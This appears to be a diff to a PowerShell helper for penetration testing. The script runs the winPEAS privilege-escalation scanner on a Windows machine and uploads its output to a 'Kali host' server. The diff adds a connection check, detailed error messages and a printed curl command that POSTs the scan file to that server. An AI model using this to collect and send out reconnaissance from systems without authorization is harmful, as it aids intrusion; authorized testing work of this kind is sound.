@@ -131,6 +131,7 @@ try {
     
 } catch {
     Write-Host "[!] Error running winpeas: $_" -ForegroundColor Red
+    Write-Host "[!] Exception: $($_.Exception.Message)" -ForegroundColor Red
     exit 1
 }
 
@@ -148,7 +149,23 @@ Write-Host "----------------------------------------" -ForegroundColor Yellow
 Get-Content $TmpOutput -Tail 10 | ForEach-Object { Write-Host $_ }
 Write-Host "----------------------------------------" -ForegroundColor Yellow
 Write-Host ""
+
+# Test connection before upload
+Write-Host "[*] Testing connection to Kali host..." -ForegroundColor Yellow
+try {
+    $TestClient = New-Object System.Net.WebClient
+    $TestResponse = $TestClient.DownloadString("$ServerUrl/health")
+    $TestClient.Dispose()
+    Write-Host "[+] Connection test successful" -ForegroundColor Green
+} catch {
+    Write-Host "[!] Warning: Cannot reach server at $ServerUrl" -ForegroundColor Yellow
+    Write-Host "[!] Error: $_" -ForegroundColor Yellow
+    Write-Host "[*] Will attempt upload anyway..." -ForegroundColor Yellow
+}
+
 Write-Host "[*] Transferring to Kali host..." -ForegroundColor Yellow
+Write-Host "[*] Upload endpoint: $ServerUrl/upload" -ForegroundColor Cyan
+Write-Host "[*] File to upload: $TmpOutput ($([Math]::Round($OutputSize / 1KB, 2)) KB)" -ForegroundColor Cyan
 Write-Host ""
 
 # Send to Kali with retry logic and progress bar
@@ -166,28 +183,20 @@ while ($RetryCount -lt $MaxRetries -and -not $Success) {
         $WebClient.Headers.Add("X-Scan-Type", $ScanType)
         $WebClient.Headers.Add("Content-Type", "text/plain")
         
-        # Progress bar event handler
-        $ProgressCallback = {
-            param($sender, $e)
-            $Percent = $e.ProgressPercentage
-            $Sent = [Math]::Round($e.BytesSent / 1KB, 2)
-            $Total = [Math]::Round($e.TotalBytesToSend / 1KB, 2)
-            
-            $ProgressBar = "[" + ("=" * [int]($Percent / 5)) + (" " * (20 - [int]($Percent / 5))) + "]"
-            Write-Host "`r[*] Uploading: $ProgressBar $Percent% ($Sent KB / $Total KB)" -NoNewline -ForegroundColor Cyan
-        }
-        
-        Register-ObjectEvent -InputObject $WebClient -EventName UploadProgressChanged -Action $ProgressCallback | Out-Null
-        
+        Write-Host "[*] Reading file bytes..." -ForegroundColor Cyan
         $FileBytes = [System.IO.File]::ReadAllBytes($TmpOutput)
+        Write-Host "[+] Read $($FileBytes.Length) bytes" -ForegroundColor Green
         
+        Write-Host "[*] Uploading to $ServerUrl/upload ..." -ForegroundColor Cyan
+        
+        # Note: UploadProgressChanged may not work in all PowerShell versions
+        # So we do a simple synchronous upload
         $ResponseBytes = $WebClient.UploadData("$ServerUrl/upload", "POST", $FileBytes)
         $ResponseText = [System.Text.Encoding]::UTF8.GetString($ResponseBytes)
         
-        # Clear progress line
-        Write-Host "`r[+] Uploading: [====================] 100% - Complete!" -NoNewline -ForegroundColor Green
-        Write-Host ""
+        Write-Host "[+] Upload complete!" -ForegroundColor Green
         Write-Host "[+] Transfer successful!" -ForegroundColor Green
+        Write-Host "[*] Server response: $ResponseText" -ForegroundColor Cyan
         
         # Try to extract report URL from response
         try {
@@ -200,15 +209,18 @@ while ($RetryCount -lt $MaxRetries -and -not $Success) {
             # Ignore parse errors
         }
         
-        # Cleanup events
-        Get-EventSubscriber | Where-Object { $_.SourceObject -eq $WebClient } | Unregister-Event
         $WebClient.Dispose()
         $Success = $true
         
     } catch {
         $RetryCount++
-        Write-Host ""
-        Write-Host "[!] Transfer failed: $_" -ForegroundColor Red
+        Write-Host "[!] Transfer failed" -ForegroundColor Red
+        Write-Host "[!] Error: $_" -ForegroundColor Red
+        Write-Host "[!] Exception: $($_.Exception.Message)" -ForegroundColor Red
+        if ($_.Exception.InnerException) {
+            Write-Host "[!] Inner Exception: $($_.Exception.InnerException.Message)" -ForegroundColor Red
+        }
+        
         if ($RetryCount -lt $MaxRetries) {
             Write-Host "[*] Retrying in 2 seconds..." -ForegroundColor Yellow
             Start-Sleep -Seconds 2
@@ -226,6 +238,7 @@ if ($Success) {
 } else {
     Write-Host "[!] Transfer failed after $MaxRetries attempts" -ForegroundColor Red
     Write-Host "[*] Output saved locally at: $TmpOutput" -ForegroundColor Yellow
-    Write-Host "[*] You can manually transfer the file" -ForegroundColor Yellow
+    Write-Host "[*] You can manually upload with:" -ForegroundColor Yellow
+    Write-Host "    curl -X POST --data-binary @'$TmpOutput' -H 'X-Hostname: $Hostname' $ServerUrl/upload" -ForegroundColor Yellow
     exit 1
 }
